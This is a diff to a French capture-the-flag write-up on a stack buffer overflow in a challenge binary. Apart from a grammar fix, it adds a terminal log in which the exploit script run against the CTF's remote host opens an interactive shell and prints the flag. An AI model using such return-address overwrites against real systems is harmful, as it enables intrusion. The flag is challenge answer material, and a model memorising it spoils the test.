@@ -74,7 +74,7 @@ La fonction appelée pour récupérer la saisie est plus intéressante, puisqu'e
 
 Il va donc être possible d'overflow le buffer, et d'écraser la sauvegarde de l'adresse de retoure de `get_int_input()` sur la stack.
 
-La stack est non executable, donc on ne va pas passer par un shellcode ... en revanche on remarque deux autres fonctions qui ne sont pas appelée par le flow d'exécution normal.
+La stack est non executable, donc on ne va pas passer par un shellcode ... en revanche on remarque deux autres fonctions qui ne sont pas appelées par le flow d'exécution normal.
 
 
 #### shell()
@@ -163,3 +163,18 @@ payload2 += p32(0xdeadbeef)
 Les 22 octets en début de payload sont le padding pour écraser le saved RIP, on peut les calculer statiquement ou regarder dans GDB la disposition de la stack quand on saisit une entrée.
 
 code : [0xb0f.py](0xb0f.py)
+
+```bash
+$ python3 0xb0f.py REMOTE
+[+] Opening connection to pwn.pwnme.fr on port 7007: Done
+Give me a number:
+[+] Shell enabled
+Give me a number:
+[*] Switching to interactive mode
+$ ls
+0xb0f
+entry.sh
+flag.txt
+$ cat flag.txt
+PWNME{3bc086a442c37cfb86ebdb63dcddc9bb}
+```
